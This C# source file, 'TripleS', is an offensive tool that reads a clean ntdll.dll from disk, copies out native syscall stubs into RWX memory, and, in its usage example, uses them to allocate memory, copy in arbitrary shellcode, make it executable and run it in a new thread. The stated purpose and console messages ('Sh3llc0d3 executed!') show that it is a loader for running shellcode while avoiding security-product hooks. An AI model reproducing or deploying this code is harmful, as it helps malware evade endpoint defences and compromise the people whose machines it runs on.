using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public UInt16 e_magic;              // Magic number
        public UInt16 e_cblp;               // Bytes on last page of file
        public UInt16 e_cp;                 // Pages in file
        public UInt16 e_crlc;               // Relocations
        public UInt16 e_cparhdr;            // Size of header in paragraphs
        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
        public UInt16 e_ss;                 // Initial (relative) SS value
        public UInt16 e_sp;                 // Initial SP value
        public UInt16 e_csum;               // Checksum
        public UInt16 e_ip;                 // Initial IP value
        public UInt16 e_cs;                 // Initial (relative) CS value
        public UInt16 e_lfarlc;             // File address of relocation table
        public UInt16 e_ovno;               // Overlay number
        public UInt16 e_res_0;              // Reserved words
        public UInt16 e_res_1;              // Reserved words
        public UInt16 e_res_2;              // Reserved words
        public UInt16 e_res_3;              // Reserved words
        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
        public UInt16 e_res2_0;             // Reserved words
        public UInt16 e_res2_1;             // Reserved words
        public UInt16 e_res2_2;             // Reserved words
        public UInt16 e_res2_3;             // Reserved words
        public UInt16 e_res2_4;             // Reserved words
        public UInt16 e_res2_5;             // Reserved words
        public UInt16 e_res2_6;             // Reserved words
        public UInt16 e_res2_7;             // Reserved words
        public UInt16 e_res2_8;             // Reserved words
        public UInt16 e_res2_9;             // Reserved words
        public UInt32 e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {

        Stub = 0x00000000,

    }


    /// The DOS header

    private IMAGE_DOS_HEADER dosHeader;

    /// The file header

    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 

    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 

    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.

    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;



    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = System.IO.File.ReadAllBytes(filePath);

        }
    }

    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;

        }
    }


    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }



    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }


    public IMAGE_FILE_HEADER FileHeader
    {
        get
        {
            return fileHeader;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get
        {
            return optionalHeader32;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get
        {
            return optionalHeader64;
        }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get
        {
            return imageSectionHeaders;
        }
    }

    public byte[] RawBytes
    {
        get
        {
            return rawbytes;
        }

    }

}

// ---code for usage example---
public class Delegates {

    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    };

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTCTE(
        out IntPtr threadHandle,
        ACCESS_MASK desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTPVM(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NTAVM(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        UInt32 AllocationType,
        UInt32 Protect);
}
// ---code for usage example---

public class TripleS {

    // Ple-please forgive me from using P/Invoke,ma-master
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    // ---code for usage example---
    public static UInt32 PAGE_READWRITE = 0x04; 
    public static UInt32 PAGE_EXECUTE_READ = 0x20;
    // ---code for usage example---

	private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero) {
            // Export not found
            throw new MissingMethodException(ExportName + " not found.");
        }
        return FunctionPtr;
    }

	public const int SYSCALL_STUB_SIZE = 23;
    public static IntPtr StealSyscallStub(string FuncName) {
        Console.WriteLine("[TripleS - Syscall Stub Stealer]");
        Console.WriteLine("[   Written By GetRektBoy724   ]");
        IntPtr output = IntPtr.Zero;
		Console.WriteLine("[*] Getting NTDLL full path...");
		// get NTDLL full path
		string NTDLLFullPath;
        try{ NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ NTDLLFullPath = null; }
        if (NTDLLFullPath != null) {
        	Console.WriteLine("[*] Reading original NTDLL from disk...");
        	// allocate and copy original DLL to unmanaged memory
        	byte[] NTDLLBytes = System.IO.File.ReadAllBytes(NTDLLFullPath);
        	IntPtr pNTDLLBytes = Marshal.AllocHGlobal(NTDLLBytes.Length);
        	Marshal.Copy(NTDLLBytes, 0, pNTDLLBytes, NTDLLBytes.Length);
            PEReader NTDLL = new PEReader(NTDLLBytes);
            int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
            int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
            IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
            // copying image header
            Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
            // copying sections
            for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++) {
                byte[] bSectionBytes = new byte[NTDLL.ImageSectionHeaders[i].SizeOfRawData];
                // Calculate offsets
                IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                IntPtr pOffsetSectionBase = (IntPtr)((UInt64)pNTDLLBytes + NTDLL.ImageSectionHeaders[i].PointerToRawData);
                Marshal.Copy(pOffsetSectionBase, bSectionBytes, 0, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
                Marshal.Copy(bSectionBytes, 0, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
            }
        	// allocate unmanaged memory for the syscall stub
        	IntPtr pSyscallStub = Marshal.AllocHGlobal(SYSCALL_STUB_SIZE); 
        	// get pointer to function
            Console.WriteLine("[*] Getting pointer to function {0}...", FuncName);
        	IntPtr pFunc = GetExportAddress(pNTDLLImage, FuncName);
            // copy from the function pointer to the allocated memory for syscall stub
            Console.WriteLine("[*] Copying syscall stub to allocated memory...");
            byte[] bSyscallStub = new byte[SYSCALL_STUB_SIZE];
            Marshal.Copy(pFunc, bSyscallStub, 0, SYSCALL_STUB_SIZE);
            Marshal.Copy(bSyscallStub, 0, pSyscallStub, SYSCALL_STUB_SIZE);
            // change syscall stub memory to RWX,using RX crashes the process,dont ask me why
            uint oldProtect;
            VirtualProtect(pSyscallStub, (UIntPtr)SYSCALL_STUB_SIZE, 0x40, out oldProtect);
            // free temporary allocations
            Marshal.FreeHGlobal(pNTDLLBytes);
            Marshal.FreeHGlobal(pNTDLLImage);
            Console.WriteLine("[+] Syscall stub of {0} is hot and ready!", FuncName);
            output = pSyscallStub;
            return output;
        }else {
        	Console.WriteLine("[-] Failed to get NTDLL path.");
            return output;
        }
	}

    public static IntPtr StealSyscallStubSilently(string FuncName) {
        IntPtr output = IntPtr.Zero;
        // get NTDLL full path
        string NTDLLFullPath;
        try{ NTDLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ NTDLLFullPath = null; }
        if (NTDLLFullPath != null) {
            // allocate and copy original DLL to unmanaged memory
            byte[] NTDLLBytes = System.IO.File.ReadAllBytes(NTDLLFullPath);
            IntPtr pNTDLLBytes = Marshal.AllocHGlobal(NTDLLBytes.Length);
            Marshal.Copy(NTDLLBytes, 0, pNTDLLBytes, NTDLLBytes.Length);
            PEReader NTDLL = new PEReader(NTDLLBytes);
            int RegionSize = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfImage : (int)NTDLL.OptionalHeader64.SizeOfImage;
            int SizeOfHeaders = NTDLL.Is32BitHeader ? (int)NTDLL.OptionalHeader32.SizeOfHeaders : (int)NTDLL.OptionalHeader64.SizeOfHeaders;
            IntPtr pNTDLLImage = Marshal.AllocHGlobal(RegionSize);
            // copying image header
            Marshal.Copy(NTDLLBytes, 0, pNTDLLImage, SizeOfHeaders);
            // copying sections
            for (int i = 0; i < NTDLL.FileHeader.NumberOfSections; i++) {
                byte[] bSectionBytes = new byte[NTDLL.ImageSectionHeaders[i].SizeOfRawData];
                // Calculate offsets
                IntPtr pVASectionBase = (IntPtr)((UInt64)pNTDLLImage + NTDLL.ImageSectionHeaders[i].VirtualAddress);
                IntPtr pOffsetSectionBase = (IntPtr)((UInt64)pNTDLLBytes + NTDLL.ImageSectionHeaders[i].PointerToRawData);
                Marshal.Copy(pOffsetSectionBase, bSectionBytes, 0, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
                Marshal.Copy(bSectionBytes, 0, pVASectionBase, (int)NTDLL.ImageSectionHeaders[i].SizeOfRawData);
            }
            // allocate unmanaged memory for the syscall stub
            IntPtr pSyscallStub = Marshal.AllocHGlobal(SYSCALL_STUB_SIZE); // dont forget to change it to RX later
            // get pointer to function
            IntPtr pFunc = GetExportAddress(pNTDLLImage, FuncName);
            // copy from the function pointer to the allocated memory for syscall stub
            byte[] bSyscallStub = new byte[SYSCALL_STUB_SIZE];
            Marshal.Copy(pFunc, bSyscallStub, 0, SYSCALL_STUB_SIZE);
            Marshal.Copy(bSyscallStub, 0, pSyscallStub, SYSCALL_STUB_SIZE);
            // change syscall stub memory to RWX,using RX crashes the process,dont ask me why
            uint oldProtect;
            VirtualProtect(pSyscallStub, (UIntPtr)SYSCALL_STUB_SIZE, 0x40, out oldProtect);
            // free temporary allocations
            Marshal.FreeHGlobal(pNTDLLBytes);
            Marshal.FreeHGlobal(pNTDLLImage);
            Console.WriteLine("[+] Syscall stub of {0} is stolen with TripleS!", FuncName);
            output = pSyscallStub;
            return output;
        }else {
            Console.WriteLine("Failed to get NTDLL path.");
            return output;
        }
    }

    // ---code for usage example---
    public static void UsageExample(byte[] ShellcodeBytes) {
        Console.WriteLine("[TripleS Usage Example Started!]");
        Console.WriteLine("[*] Getting Required Syscalls...");
        IntPtr pNTAVM = StealSyscallStubSilently("NtAllocateVirtualMemory");
        IntPtr pNTPVM = StealSyscallStubSilently("NtProtectVirtualMemory");
        IntPtr pNTCTE = StealSyscallStubSilently("NtCreateThreadEx");
        Delegates.NTAVM fSyscallNTAVM = (Delegates.NTAVM)Marshal.GetDelegateForFunctionPointer(pNTAVM, typeof(Delegates.NTAVM));
        Delegates.NTPVM fSyscallNTPVM = (Delegates.NTPVM)Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(Delegates.NTPVM));
        Delegates.NTCTE fSyscallNTCTE = (Delegates.NTCTE)Marshal.GetDelegateForFunctionPointer(pNTCTE, typeof(Delegates.NTCTE));
        IntPtr ProcessHandle = new IntPtr(-1); // we just need our pseudo-handle,this is just the same as GetCurrentProcess function ;)
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationType = (UInt32)Delegates.AllocationType.Commit | (UInt32)Delegates.AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        fSyscallNTAVM(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationType, PAGE_READWRITE);
        Console.WriteLine("[*] Copying Shellcode...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        Console.WriteLine("[*] Changing memory protection setting...");
        UInt32 newProtect = 0;
        fSyscallNTPVM(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, PAGE_EXECUTE_READ, ref newProtect);
        IntPtr threadHandle = new IntPtr(0);
        Delegates.ACCESS_MASK desiredAccess = Delegates.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Delegates.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        bool bCreateSuspended = false;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        // create new thread
        Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
        fSyscallNTCTE(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
    }
    // ---code for usage example--- 
}